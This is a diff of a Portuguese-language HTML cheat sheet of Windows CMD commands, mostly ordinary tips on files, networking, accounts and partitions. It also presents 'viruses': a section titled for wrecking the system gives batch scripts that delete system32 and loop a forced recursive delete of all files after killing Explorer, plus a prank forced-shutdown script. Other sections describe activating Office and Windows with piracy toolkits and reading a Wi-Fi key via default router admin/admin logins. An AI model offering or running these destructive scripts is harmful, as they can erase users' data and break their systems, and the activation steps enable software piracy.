@@ -40,367 +40,349 @@
  
     <center><h2 style="font-size: 2rem;" >BRINCANDO DE DOS</h2></center>
 
-    <div id="paragrafocamandos" style="overflow-x: auto;">
+   <div id="paragrafocamandos" style="overflow-x: auto; width: 100%;">
 
-        
-       
+<p>
+    <pre>
 
-        <P>
-            <pre>
-                <hr id="linhalargura">
-                
-                    <center> <strong>COMANDOS em BATCH SCRIPT(CMD)</strong></center>
-                    
-                    <strong>TIME</strong>- ALTERA A HORA
-                    <strong>DATE</strong>- ALTERA DATA
-                    <strong>VER</strong>- VERSAO DO SISTEMA
-                    <strong>MEM</strong>- MEMORIA
-                    <strong>VOL</strong>  - VOLUME DO SISTEMA  OU SEJA O NOME DAS UNIDADES EX UNIDADE C
-                    <strong>labe</strong>-altera o nome do volume 
-                    <strong>CLS</strong>- limpa TELA
-                    <strong>Dir</strong>- visualiza o que tem nas pasta, e também cria arquivos dentro do diretório <br> ex: dir>nome_do_arquivo_ea extensao do arquivo ex: txt, docx,etc 
-                    <strong>:</strong> - troca de unidade c: ou f: ou G:
-                    <strong>md</strong>- cria pasta
-                    <strong>CD</strong> - ENTRA NA PASTA (quando vc tem uma pasta com espaço em branco vc presisa dar " eo<br> nome da pasta)
-                    <strong>CD ..</strong> - VOLTA PAGINA
-                    <strong>CD\</strong> - VOLTA PASTA RAIZ
-                    <strong>TREE</strong>  - COMANDO MOSTRA A ARVORE DA PASTA
-                    ENTRA DENTRO DE PASTA ESPECIFICA CD \ MAIS PASTA PAI\ MAIS PASTA FILHO
-                    <strong>EDIT</strong>  - EDITOR DE TEXTO ex EDIT ESPAÇO NOME DO ARQUIVO OBS: USAR ALT PARA NAO USAR MAUSE
-                    <strong>REN</strong>  - COMONDO QUE RENOMEIA O ARQUIVO OU SEJA DA A EXTENSÃO EX ren nome do <br> arquivo espaço nome do novo arquivo
-                    <strong>copy</strong>  - copia arquivo ex: copy nome do arquivo espaço caminho do novo arquivo e pasta que <br> deseja copiar
-                    <strong>copy todos os arquivos</strong>  - vc entra na pasta e da o seguinte comando ex: copy *.nome da pasta,<br> espaço,caminho e pasta
-                    <strong>*</strong> - siguinifica tudo, ou seja 
-                    copia arquivos de extençoes ex copy *.doc ,espaço, caminho e pasta.
-                    <strong>move</strong> - mesmo coisa do copy so que move ao inves de copiar
-                    <strong>del</strong>  - apaga arquivos ex: del espaço nome do arquivo
-                        (del/q/f/a/s * .  ”tipo do arquivo”)
-                    <strong>rd</strong>  - apaga pasta vazias
-                    <strong>rd /?</strong>  - pede ajuda ao rd, rd /s remove os arquivos
-                                rd /q remove os arquivos sem pedir permissão
-                    <strong>ctrl e c</strong>  - interrompe o que o dos esta execultando
-                    <strong>xcopy</strong> - copia pastas enteras
-                    <strong> help</strong>   - relaçoes de comando pausado ex help | more
-                    attrib - exibe todos os aruivos e seus atributos ou seja ate os ocultos, voce tambem pode <br> deixar o arquivo oculto
-                                atraves dos atributos ex: atrib +h nome do arquivo,(- tira, + coloca) ver atributos /?
-                    <strong> type</strong>  - visualiza o arquivo de texto sem ter que abrir
-                    <strong>PING</strong>  = ping e como se fosse um medidor de velocidade de rede
-                            (abra cmd digite ping mais o endereço ) ele forneço informação
-                            como quantos dados foram eviados e recebidos e uma estatistica 
-                            do tempo medio em comparação com minimo eo alto,quanto menor o
-                            tempo melhor.
-                    <strong>Tracert</strong> = traça o caminho do computador ate o servidor
-                    <strong>Tasklist</strong> = exibe todos os arquivos em exculção
-                        Obs: e possível parar programas em execução com o comando pause eo nome do                programa  
-                    
-                    <strong>Dir</strong> =  mostrar pasta ocultas do sistema = dir /a:hs 
-                                
-                    <strong>Systeminfo</strong>  = carrega informações do sistema
-                    <strong>wmic baseboard get product,manufacturer</strong>  = placa mae e fabricante para baixar drives 
-                    <strong>robocopy:</strong>  backp de arquivos ex = robocopy (caminho da pasta a ser copiada) espaço <br> (caminho do destino da copia)
-                    
-                    reinicializar com modo de segurança Windows 8
-                    cmd---bdcedit  /set  bootmenupolicy  legacy
+<hr id="linhalargura">
+	    
+	    BRINCANDO DE DOS
 
-  
+TIME- ALTERA A HORA
+DATE- ALTERA DATA
+VER- VERSAO DO SISTEMA
+MEM- MEMORIA
+VOL - VOLUME DO SISTEMA  OU SEJA O NOME DAS UNIDADES EX UNIDADE C
+labe-altera o nome do volume 
+CLS- limpa TELA
+dir- visualiza o que tem nas pasta, e também cria arquivos dentro do diretório ex: dir>nome_do_arquivo_ea extensao do arquivo ex: txt, docx,etc 
+:- troca de unidade c: ou f: ou G:
+md- cria pasta
+CD - ENTRA NA PASTA (quando vc tem uma pasta com espaço em branco vc presisa dar " eo nome da pasta)
+CD .. - VOLTA PAGINA
+CD\- VOLTA PASTA RAIZ
+TREE - COMANDO MOSTRA A ARVORE DA PASTA
+ENTRA DENTRO DE PASTA ESPECIFICA CD \ MAIS PASTA PAI\ MAIS PASTA FILHO
+EDIT - EDITOR DE TEXTO ex EDIT ESPAÇO NOME DO ARQUIVO OBS: USAR ALT PARA NAO USAR MAUSE
+REN - COMONDO QUE RENOMEIA O ARQUIVO OU SEJA DA A EXTENSÃO EX ren nome do arquivo espaço nome do novo arquivo
+copy - copia arquivo ex: copy nome do arquivo espaço caminho do novo arquivo e pasta que deseja copiar
+copy todos os arquivos - vc entra na pasta e da o seguinte comando ex: copy *.nome da pasta, espaço,caminho e pasta
+* - siguinifica tudo
+copy arquivos de extençoes ex copy *.doc ,espaço, caminho e pasta
+move- mesmo coisa do copy so que move ao inves de copiar
+del - apaga arquivos ex: del espaço nome do arquivo
+                   (del/q/f/a/s * .  ”tipo do arquivo”)
+rd - apaga pasta vazias
+rd /? - pede ajuda ao rd, rd /s remove os arquivos 
+                          rd /q remove os arquivos sem pedir permissão
+ctrl e c - interrompe o que o dos esta execultando
+xcopy copia pastas enteras
+help - relaçoes de comando pausado ex help | more
+attrib - exibe todos os aruivos e seus atributos ou seja ate os ocultos, voce tambem pode deixar o arquivo oculto
+           atraves dos atributos ex: atrib +h nome do arquivo,(- tira, + coloca) ver atributos /?
+type - visualiza o arquivo de texto sem ter que abrir
+PING= ping e como se fosse um medidor de velocidade de rede
+      (abra cmd digite ping mais o endereço ) ele forneço informação
+      como quantos dados foram eviados e recebidos e uma estatistica 
+      do tempo medio em comparação com minimo eo alto,quanto menor o
+      tempo melhor.
+Tracert= traça o caminho do computador ate o servidor
+Tasklist= exibe todos os arquivos em exculção 
+                 Obs: e possível parar programas em execução com o comando pause eo nome do                programa  
 
-   
+Dir=  mostrar pasta ocultas do sistema = dir /a:hs 
 
-		<hr id="linhalargura">
-                    
-                    <strong>CODIGO DA PASTA SECRETA </strong> 
-                    
-                    cls
-                    @ECHO OFF
-                    title Folder NOMEDAPASTA
-                    if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
-                    if NOT EXIST NOMEDAPASTA goto MDLOCKER
-                    :CONFIRM
-                    echo EXODIA Diz: Tem Certeza Que Deseja Ocultar a Pasta ? (S/N)
-                    set/p "cho=>"
-                    if %cho%==S goto LOCK
-                    if %cho%==s goto LOCK
-                    if %cho%==n goto END
-                    if %cho%==N goto END
-                    echo Invalid choice.
-                    goto CONFIRM
-                    :LOCK
-                    ren NOMEDAPASTA "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-                    attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-                    echo Folder locked
-                    goto End
-                    :UNLOCK
-                    echo EXODIA Diz: Digite Sua Senha
-                    set/p "pass=>"
-                    if NOT %pass%== SUASENHA goto FAIL
-                    attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-                    ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" NOMEDAPASTA
-                    echo Folder Unlocked successfully
-                    goto End
-                    :FAIL
-                    echo Invalid password
-                    goto end
-                    :MDLOCKER
-                    md NOMEDAPASTA
-                    echo NOMEDAPASTA created successfully
-                    goto End
-                    :End
-	
+Systeminfo = carrega informações do sistema
+wmic baseboard get product,manufacturer = placa mae e fabricante para baixar drives 
+robocopy: backp de arquivos ex = robocopy (caminho da pasta a ser copiada) espaço (caminho do destino da copia)
 
-	
-                    <hr id="linhalargura">
-                 
-                    <strong>VIROS PARA BRINCAR</strong> 
-                    
-                    
-                    @echo off 
-                    Title (titulo)
-                    Color (código da cor 5d)
-                    Echo: (mensagem)
-                    Pause 
-                    Echo: (mensagem)
-                    Shutdown –s  –t 60 –c “(mensagem)”
-                    
-                    Shutdown –a (cancela o desligamento, -r no começo so reinicia o pc)
-                    <hr id="linhalargura">
-                    
-                    
-                     <strong>VIROS PARA LASCAR SISTEMA</strong> 
-                    
-                    @ECHO OFF
-                    DEL C:\WINDOWS\system32
-                    
-                    --
-                    @echo off
-                    Taskkill /f /im explorer.exe
-                    Cd ..
-                    Cd ..
-                    Cd ..
-                    :repetir
-                    Del  /f  /s  /q *.*
-                    Goto repetir
-	
-                    <hr id="linhalargura">
-                    
-                        
-                    <strong>CRIANDO E REMOVENDO CONTAS CMD
-                    </strong>  
-                    NET USERS – EXIBE A CONTA QUE VC ESTA
-                    
-                    NET  LOCALGROUP ADMINISTRADORES – EXIBE TODAS AS CONTAS DE ADMINISTRADORES
-                    
-                    NET USERS (NOME DA CONTA) ESPAÇO (SENHA SE VC QUIZER) /ADD- CRIA UMA CONTA LIMITADA 
-                    
-                    NET USERS (NOME DA CONTA) ESPAÇO /delete – deleta conta de usuário
-                    
-                    NET  LOCALGROUP ADMINISTRADORES – EXIBE TODAS AS CONTAS DE ADMINISTRADORES (espaço) (nome da conta ) /add – adiciona uma conta limitada a uma conta de usuário
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                     <strong> ADICIONANDO CONTA ADD PELO CMD</strong> 
-                    
-                    NET USER (NOME) (SENHA SE QUIZER) /ADD  = “ADD” ADICIONA CONTA “DELETE” DELETA 
-                    
-                    CONTA
-                    
-                    NET LOCALGROUP ADMINISTRADORES  = ME DIZ CONTAS CONTAS ADD PC POSSUI
-                    NET LOCALGROUP ADMINISTRADORES (NOME DA CONTA QUE VC DESEJA TORNALA ADD) /ADD
-                    
-                    MELHORANDO A CONEÇÃO COM A INTERNET
-                    
-                    ativar net ao máximo NETSH INT TCP SET GLOBAL CONGESTIONPROVIDER=CTCP
-                    
-                    desativar net ao máximo NETSH INT TCP SET GLOBAL CONGESTIONPROVIDER=NONE 
-                    
-                    <hr id="linhalargura">
-                    
-                    <strong>Formulas: formula p/ ativar conexão ao máximo</strong>   ( netsh int tcp set global congestionprovider=ctcp )
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>Formula utilizada p/ desativar conexão ao máximo</strong>   ( netsh int tcp set global congestionprovider=none )
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>COMO RESTAURAR O GOOGLE CHOME</strong>  
-                    Atalho chrome
-                    DESTINO:"C:\Program Files\Google\Chrome\Application\chrome.exe"
-                    INICIAR EM: "C:\Program Files\Google\Chrome\Application"
-                    
-                    
-                    Abra o EXECUTAR digite appdata click em local
-                    --abra o GOOGLE –abra CHROME ---delete a pasta USER DATA
-                    
-                    ---ADBLOCK PLUS app que bloqueia anúncios
-                    -----FVD Video Downloader---- dowload de vídeos
-                    
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                      <strong>REPAROS PELO CMD</strong>  
-                    
-                    CHKDSK
-                    
-                    SFC /?
-                    SCANNOW
-                    CHKDSK /?
-                    /F	
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong> LIMPEZA PELO CMD
-                    </strong> 
-                    @echo off
-                    del /s /f /q c:\windows\temp\*.*
-                    rd /s /q c:\windows\temp
-                    md c:\windows\temp
-                    del /s /f /q C:\WINDOWS\Prefetch
-                    del /s /f /q %temp%\*.*
-                    rd /s /q %temp%
-                    md %temp%
-                    deltree /y c:\windows\tempor~1
-                    deltree /y c:\windows\temp
-                    deltree /y c:\windows\tmp
-                    deltree /y c:\windows\ff*.tmp
-                    deltree /y c:\windows\history
-                    deltree /y c:\windows\cookies
-                    deltree /y c:\windows\recent
-                    deltree /y c:\windows\spool\printers
-                    del c:\WIN386.SWP
-                    cls
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>LOGANDO  COMO ADMINISTRAOR</strong>  
-                    ATIIVAR –CMD ADM =  
-                    NET  USER  ADMINISTRADOR   /ACTIVE : YES
-                    NET  USER  ADMINISTRADOR   /ACTIVE : NO
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>LIMPANDO PC PELO EXECULTAR</strong>   
-                    PREFETCH  - LIMPA TUDO
-                    %TEMP% - LIMPA TUDO
-                    RECENT
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>COMANDO PARA EDITAR CONTAS PELO EXECULTAR</strong>  
-                    Control userpasswords2 
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>ATIVAÇÃO DO OFFICE Office 2010 Toolkit</strong>   
-                    -license management
-                    -license for – profissional plus
-                    -key management 
-                    -key for - profissional plus 
-                    -license backup
-                    -backup name digite office
-                    -main
-                    - EZ Activador
-                    
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>ATIVAÇÃO DO Windows 8 pro by windows TuTo</strong>  
-                    (somente para versão Windows 8.0/8.1pro - somente para versão Windows 8.0/8.1enterpreise
-                    Nada além do pro ou interpreise. Versão Build-9200 w.8.0/Build-9600 )
-                    -product key
-                    -product –windows 8.0 ou 8.1
-                    -edition profissional enterpreise
-                    -install
-                    -Activation – Active
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong> MUDANÇA DA SENHA WERELLES</strong> 
-                    
-                    Cmd
-                    Ipconfig
-                    Gateway padrão
-                    Navegador
-                    Ctrol-v na barra de navegação
-                    Senha 
-                    Usuário-admin
-                    Senha – admin
-                    Interface
-                    Wireless  procurar senha ou key 
-                    
-                    Ou
-                    
-                    Alteração de rede
-                    Propriedade
-                    Tcp/ip versão 4
-                    Propriedades
-                    Usar o seguinte indereço de ip
-                    192.168.1.3
-                    192.168.1.1
-                    192.168.1.1
-                    Navegador  ctrol 192.168.1.1
-                    
-                    COMO RETIRAR A SENHA DO WINDOWS 8
-                    Netplwiz
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>FORMATAÇÃO</strong>  
-                    
-                    
-                    *Redefinição de fabrica passe o dedo ao lado direito da tela va em configurações
-                    E click em mudar configurações do computador –Geral—desça a barra ---Remover tudo e reinstalar <br> o computador  
-                    *HD com Linux ( exclua as partições- click na partição –opçoes de unidades e excluir—excluindo <br> todas click em novo – aplicar e ok- click na partição que esta com o nome primário e formatar <br> para deletar todos os dados do linux) ps: serve para limpar qualquer HD
-                    
-                    *Windows 8 –ABNT2---se pedir chave favor colocar—personalizada---configuraçoes expressas—entrar sem <br> uma conta da Microsoft (fica no lado esquerdo em baixo da tela---conta local—nome de usuário e<br> SE quiser senha ) 
-                    
-                    *instalação com pendrive Bootavel ---opção p/ boot na bios e “Removable Devices”
-                    
-                    *Windows 7 ABNT2---se pedir chave favor colocar—personalizada- barra de chave ---click em ativar <br> altomaticamente para estar ativando depois ----rede domestica 
-                    
-                    * DRIVERS GENIUS PROFISSIONAL ---INSTALE O programa ---fazer backp de drivers ---selecione os <br> drivers---seguinte –selecionar tipos de backp ---instalar automaticamente—selecione aonde <br> vai ser salvo---click em salvar e depois em seguinte – os becaps foram instalados com êxito click <br>em terminar(lembre instalar o programa di novo) agora execulte o becap---start restory ---sim 
-                    
-                    
-                    <strong>*site para baixar vários programas ao mesmo tempo--- https://ninite.com/</strong>  
-                    
-                    <hr id="linhalargura">
-                    
-                    
-                    <strong>REALIZANDO PARTIÇOES</strong>    
-                    
-                    PARA INCLUIR
-                    Primeiramente click em computador lado esquerdo –Gerenciar
-                    ---Gerenciamento de disco, espera carregar 
-                    ----Click na partição com maior volume (para adicionar uma nova partcição)
-                    ----CLICK em diminuir volume
-                    ----digite o tamanho a ser diminuído e click em ok
-                    -Agora e preciso formatar ---click com esquerdo ---click em novo volume simples 
-                    ---click em avançar ,deixe o tamanho inteiro da partição ---avançar ---escolha a letra da <br> unidade e avançar
-                    --deixe marcado a opção formatar este volume com as configurações, deixe em NTFS. Para tamanho <br> de partições grande (recomendado) –TAMANHO DA UNIDADE ---PADRAO 
-                    ---TITULO DA UNIDADE (NOME) selecione a caixa de formatação rápida e opcional selecione a caixa <br> de compactação e tudo que vc mandar para essa partição sera compactada
-                    
-                    PARA EXCLUIR
-                    Primeiramente click em computador lado esquerdo –Gerenciar
-                    ---Gerenciamento de disco, espera carregar 
-                    ---click na partição que deseja exclui
-                    --excluir volume 
-                    --depois click no volume que deseja almentar e ---estender volume avançar ---deixe tudo que esta <br> disponível click em avançar e concluir
-                       
-                        </pre>
-                            </P>
-                    
-                  </div>
+reinicializar com modo de segurança Windows 8
+cmd---bdcedit  /set  bootmenupolicy  legacy
+
+<hr id="linhalargura">	    
+	    
+CODIGO DA PASTA SECRETA
+
+cls
+@ECHO OFF
+title Folder NOMEDAPASTA
+if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
+if NOT EXIST NOMEDAPASTA goto MDLOCKER
+:CONFIRM
+echo EXODIA Diz: Tem Certeza Que Deseja Ocultar a Pasta ? (S/N)
+set/p "cho=>"
+if %cho%==S goto LOCK
+if %cho%==s goto LOCK
+if %cho%==n goto END
+if %cho%==N goto END
+echo Invalid choice.
+goto CONFIRM
+:LOCK
+ren NOMEDAPASTA "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+echo Folder locked
+goto End
+:UNLOCK
+echo EXODIA Diz: Digite Sua Senha
+set/p "pass=>"
+if NOT %pass%== SUASENHA goto FAIL
+attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" NOMEDAPASTA
+echo Folder Unlocked successfully
+goto End
+:FAIL
+echo Invalid password
+goto end
+:MDLOCKER
+md NOMEDAPASTA
+echo NOMEDAPASTA created successfully
+goto End
+:End
+
+<hr id="linhalargura">
+	    
+VIROS PARA BRINCAR
+@echo off 
+Title (titulo)
+Color (código da cor 5d)
+Echo: (mensagem)
+Pause 
+Echo: (mensagem)
+Shutdown –s  –t 60 –c “(mensagem)”
+
+
+Shutdown –a (cancela o desligamento, -r no começo so reinicia o pc)
+
+<hr id="linhalargura">	    
+	    
+VIROS PARA LASCAR SISTEMA
+
+@ECHO OFF
+DEL C:\WINDOWS\system32
+
+--
+@echo off
+Taskkill /f /im explorer.exe
+Cd ..
+Cd ..
+Cd ..
+:repetir
+Del  /f  /s  /q *.*
+Goto repetir
+	    
+<hr id="linhalargura">
+	    
+CRIANDO E REMOVENDO CONTAS CMD
+
+NET USERS – EXIBE A CONTA QUE VC ESTA
+
+NET  LOCALGROUP ADMINISTRADORES – EXIBE TODAS AS CONTAS DE ADMINISTRADORES
+
+NET USERS (NOME DA CONTA) ESPAÇO (SENHA SE VC QUIZER) /ADD- CRIA UMA CONTA LIMITADA 
+
+NET USERS (NOME DA CONTA) ESPAÇO /delete – deleta conta de usuário
+
+NET  LOCALGROUP ADMINISTRADORES – EXIBE TODAS AS CONTAS DE ADMINISTRADORES (espaço) (nome da conta ) /add – adiciona uma conta limitada a uma conta de usuário
+
+
+
+<hr id="linhalargura">
+
+ADICIONANDO CONTA ADD PELO CMD
+
+NET USER (NOME) (SENHA SE QUIZER) /ADD  = “ADD” ADICIONA CONTA “DELETE” DELETA 
+
+CONTA
+
+NET LOCALGROUP ADMINISTRADORES  = ME DIZ CONTAS CONTAS ADD PC POSSUI
+NET LOCALGROUP ADMINISTRADORES (NOME DA CONTA QUE VC DESEJA TORNALA ADD) /ADD
+
+<hr id="linhalargura">
+	    
+MELHORANDO A CONEÇÃO COM A INTERNET
+
+ativar net ao máximo NETSH INT TCP SET GLOBAL CONGESTIONPROVIDER=CTCP
+
+desativar net ao máximo NETSH INT TCP SET GLOBAL CONGESTIONPROVIDER=NONE 
+
+ formulas: formula p/ ativar conexão ao máximo ( netsh int tcp set global congestionprovider=ctcp )
+
+Formula utilizada p/ desativar conexão ao máximo ( netsh int tcp set global congestionprovider=none )
+
+<hr id="linhalargura">
+	    
+COMO RESTAURAR O GOOGLE CHOME
+Atalho chrome
+DESTINO:"C:\Program Files\Google\Chrome\Application\chrome.exe"
+INICIAR EM: "C:\Program Files\Google\Chrome\Application"
+
+
+Abra o EXECUTAR digite appdata click em local
+--abra o GOOGLE –abra CHROME ---delete a pasta USER DATA
+
+---ADBLOCK PLUS app que bloqueia anúncios
+-----FVD Video Downloader---- dowload de vídeos
+
+
+<hr id="linhalargura">
+
+ REPAROS PELO CMD
+
+CHKDSK
+
+SFC /?
+SCANNOW
+CHKDSK /?
+/F	
+
+<hr id="linhalargura">	    
+LIMPEZA PELO CMD
+
+@echo off
+del /s /f /q c:\windows\temp\*.*
+rd /s /q c:\windows\temp
+md c:\windows\temp
+del /s /f /q C:\WINDOWS\Prefetch
+del /s /f /q %temp%\*.*
+rd /s /q %temp%
+md %temp%
+deltree /y c:\windows\tempor~1
+deltree /y c:\windows\temp
+deltree /y c:\windows\tmp
+deltree /y c:\windows\ff*.tmp
+deltree /y c:\windows\history
+deltree /y c:\windows\cookies
+deltree /y c:\windows\recent
+deltree /y c:\windows\spool\printers
+del c:\WIN386.SWP
+cls
+
+<hr id="linhalargura">
+	    
+LOGANDO  COMO ADMINISTRAOR
+ATIIVAR –CMD ADM =  
+NET  USER  ADMINISTRADOR   /ACTIVE : YES
+NET  USER  ADMINISTRADOR   /ACTIVE : NO
+
+<hr id="linhalargura">
+	    
+LIMPANDO PC PELO EXECULTAR 
+PREFETCH  - LIMPA TUDO
+%TEMP% - LIMPA TUDO
+RECENT
+
+<hr id="linhalargura">
+	    
+COMANDO PARA EDITAR CONTAS PELO EXECULTAR
+Control userpasswords2 
+
+<hr id="linhalargura">
+	    
+ATIVAÇÃO DO OFFICE Office 2010 Toolkit 
+-license management
+-license for – profissional plus
+-key management 
+-key for - profissional plus 
+-license backup
+-backup name digite office
+-main
+- EZ Activador
+
+
+<hr id="linhalargura">
+
+ATIVAÇÃO DO Windows 8 pro by windows TuTo
+(somente para versão Windows 8.0/8.1pro - somente para versão Windows 8.0/8.1enterpreise
+Nada além do pro ou interpreise. Versão Build-9200 w.8.0/Build-9600 )
+-product key
+-product –windows 8.0 ou 8.1
+-edition profissional enterpreise
+-install
+-Activation – Active
+
+<hr id="linhalargura">
+	    
+MUDANÇA DA SENHA WERELLES
+
+Cmd
+Ipconfig
+Gateway padrão
+Navegador
+Ctrol-v na barra de navegação
+Senha 
+Usuário-admin
+Senha – admin
+Interface
+Wireless  procurar senha ou key 
+
+Ou
+
+Alteração de rede
+Propriedade
+Tcp/ip versão 4
+Propriedades
+Usar o seguinte indereço de ip
+192.168.1.3
+192.168.1.1
+192.168.1.1
+Navegador  ctrol 192.168.1.1
+
+COMO RETIRAR A SENHA DO WINDOWS 8
+Netplwiz
+
+<hr id="linhalargura">
+	    
+FORMATAÇÃO
+
+
+*Redefinição de fabrica passe o dedo ao lado direito da tela va em configurações
+E click em mudar configurações do computador –Geral—desça a barra ---Remover tudo e reinstalar o computador  
+*HD com Linux ( exclua as partições- click na partição –opçoes de unidades e excluir—excluindo todas click em novo – aplicar e ok- click na partição que esta com o nome primário e formatar para deletar todos os dados do linux) ps: serve para limpar qualquer HD
+
+*Windows 8 –ABNT2---se pedir chave favor colocar—personalizada---configuraçoes expressas—entrar sem uma conta da Microsoft (fica no lado esquerdo em baixo da tela---conta local—nome de usuário e SE quiser senha ) 
+
+*instalação com pendrive Bootavel ---opção p/ boot na bios e “Removable Devices”
+
+*Windows 7 ABNT2---se pedir chave favor colocar—personalizada- barra de chave ---click em ativar altomaticamente para estar ativando depois ----rede domestica 
+
+* DRIVERS GENIUS PROFISSIONAL ---INSTALE O programa ---fazer backp de drivers ---selecione os drivers---seguinte –selecionar tipos de backp ---instalar automaticamente—selecione aonde vai ser salvo---click em salvar e depois em seguinte – os becaps foram instalados com êxito click em terminar(lembre instalar o programa di novo) agora execulte o becap---start restory ---sim 
+
+
+*site para baixar vários programas ao mesmo tempo--- https://ninite.com/
+
+<hr id="linhalargura">
+	    
+REALIZANDO PARTIÇOES  
+
+PARA INCLUIR
+Primeiramente click em computador lado esquerdo –Gerenciar
+---Gerenciamento de disco, espera carregar 
+----Click na partição com maior volume (para adicionar uma nova partcição)
+----CLICK em diminuir volume
+----digite o tamanho a ser diminuído e click em ok
+-Agora e preciso formatar ---click com esquerdo ---click em novo volume simples 
+---click em avançar ,deixe o tamanho inteiro da partição ---avançar ---escolha a letra da unidade e avançar
+--deixe marcado a opção formatar este volume com as configurações, deixe em NTFS. Para tamanho de partições grande (recomendado) –TAMANHO DA UNIDADE ---PADRAO 
+---TITULO DA UNIDADE (NOME) selecione a caixa de formatação rápida e opcional selecione a caixa de compactação e tudo que vc mandar para essa partição sera compactada
+
+PARA EXCLUIR
+Primeiramente click em computador lado esquerdo –Gerenciar
+---Gerenciamento de disco, espera carregar 
+---click na partição que deseja exclui
+--excluir volume 
+--depois click no volume que deseja almentar e ---estender volume avançar ---deixe tudo que esta disponível click em avançar e concluir
+ 
+
+<hr id="linhalargura">
+
+
+	    
+    </pre>
+  </p>
+
+</div>
+
                         
                          
                 
